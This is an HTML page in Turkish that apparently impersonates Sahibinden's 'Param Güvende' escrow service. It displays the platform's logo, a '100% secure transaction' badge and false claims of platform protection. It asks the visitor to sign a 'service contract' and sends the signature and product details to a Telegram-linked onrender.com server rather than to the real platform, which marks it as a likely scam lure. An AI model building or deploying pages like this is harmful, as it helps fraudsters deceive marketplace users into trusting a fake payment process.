<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Param Güvende Sözleşme</title>

<style>
body {
    margin:0;
    font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
    background:#f4f6f8;
}

/* HEADER */
.header {
    background:#0f172a;
    padding:18px 12px;
}

.header-center {
    display:flex;
    flex-direction:column;
    align-items:center;
    text-align:center;
    gap:6px;
}

.logo { height:28px; }

.brand { color:#ffffff; font-size:14px; font-weight:600; }

.sub { color:#cbd5e1; font-size:12px; }

.secure-badge {
    margin-top:6px;
    background:linear-gradient(135deg, #16a34a, #22c55e);
    color:white;
    font-size:11px;
    padding:4px 10px;
    border-radius:999px;
    font-weight:600;
}

/* CONTAINER */
.container {
    padding:16px;
    max-width:720px;
    margin:auto;
}

/* TRUST BOX */
.trust-box {
    background:#ecfeff;
    border:1px solid #67e8f9;
    padding:12px;
    border-radius:10px;
    font-size:13px;
    margin-bottom:12px;
}

/* CARD */
.card {
    background:white;
    border-radius:12px;
    padding:14px;
    margin-bottom:10px;
    box-shadow:0 2px 8px rgba(0,0,0,0.04);
}

.title {
    font-weight:700;
    margin-bottom:6px;
}

.text {
    font-size:13px;
    color:#374151;
    line-height:1.5;
}

/* ÜRÜN */
.product-img {
    width:100%;
    border-radius:10px;
    margin-bottom:8px;
}

/* SIGNATURE */
canvas {
    width:100%;
    height:180px;
    border:2px dashed #cbd5e1;
    border-radius:10px;
    background:#fff;
}

/* ACTIONS */
.actions {
    position:sticky;
    bottom:0;
    background:white;
    padding:12px;
    box-shadow:0 -3px 10px rgba(0,0,0,0.1);
}

button {
    width:100%;
    padding:14px;
    border:none;
    border-radius:10px;
    font-weight:700;
    font-size:14px;
}

.primary {
    background:#16a34a;
    color:white;
}

.secondary {
    margin-top:8px;
    background:#e5e7eb;
}
</style>
</head>

<body>

<!-- HEADER -->
<div class="header">
    <div class="header-center">
        <img src="https://upload.wikimedia.org/wikipedia/tr/archive/5/51/20121213095814%21Sahibinden-2010-200px.jpg" class="logo">
        <div class="sub">Param Güvende Hizmet Sözleşmesi</div>
        <div class="secure-badge">🔒 %100 Güvenli İşlem</div>
    </div>
</div>

<div class="container">

<div class="trust-box">
🛡️ Bu işlem, ödeme güvenliği sağlamak amacıyla platform güvencesi altında yürütülmektedir.
</div>

<!-- ÜRÜN BİLGİSİ -->
<div class="card">
<div class="title">Ürün Bilgisi</div>
<img id="pimg" class="product-img" alt="Ürün resmi">
<div class="text" id="pname">Ürün yükleniyor...</div>
<div class="text" id="pprice"></div>
</div>

<!-- SENİN TÜM CARD'LARIN AYNEN -->
<div class="card">
<div class="title">Hizmetin Kapsamı</div>
<div class="text">
Platform, alıcı ile satıcı arasında gerçekleşen işlemlerde ödeme aracılık hizmeti sunar.
</div>
</div>

<!-- SIGN -->
<div class="card">
<div class="title">İmzanız</div>
<canvas id="pad"></canvas>
<button class="secondary" onclick="clearPad()">Temizle</button>
</div>

<div class="card">
<label>
<input type="checkbox" id="check">
 Sözleşmeyi okudum ve kabul ediyorum
</label>
</div>

</div>

<div class="actions">
<button class="primary" onclick="send()">Sözleşmeyi Onayla ve İmzala</button>
</div>

<script src="https://cdn.jsdelivr.net/npm/signature_pad@4.0.0/dist/signature_pad.umd.min.js"></script>

<script>
const canvas = document.getElementById("pad");
const pad = new SignaturePad(canvas);

function resize(){
 let ratio = Math.max(window.devicePixelRatio,1);
 canvas.width = canvas.offsetWidth * ratio;
 canvas.height = canvas.offsetHeight * ratio;
 canvas.getContext("2d").scale(ratio,ratio);
}
resize();
window.onresize = resize;

function clearPad(){
 pad.clear();
}

// ÜRÜN ÇEK (Render)
fetch("https://telegram-product-system.onrender.com/product")
.then(r => r.json())
.then(d => {
 document.getElementById("pname").innerText = "Ürün: " + d.name;
 document.getElementById("pprice").innerText = "Fiyat: " + d.price + " ₺";
 document.getElementById("pimg").src = d.image;
})
.catch(() => {
 document.getElementById("pname").innerText = "Ürün bilgisi alınamadı";
 document.getElementById("pprice").innerText = "";
});

// GÖNDER (Telegram)
function send(){

 if(!document.getElementById("check").checked){
   alert("Sözleşmeyi kabul etmelisiniz");
   return;
 }

 if(pad.isEmpty()){
   alert("İmza gereklidir");
   return;
 }

 const data = pad.toDataURL();

 fetch("https://telegram-product-system.onrender.com/submit", {
   method:"POST",
   headers:{"Content-Type":"application/json"},
   body: JSON.stringify({
     signature: data,
     product:{
       name: document.getElementById("pname").innerText,
       price: document.getElementById("pprice").innerText
     }
   })
 })
 .then(response => {
   if (!response.ok) {
     throw new Error("Gönderim başarısız");
   }
   alert("Sözleşme gönderildi");
 })
 .catch(() => {
   alert("Gönderim sırasında hata oluştu");
 });
}
</script>

</body>
</html>
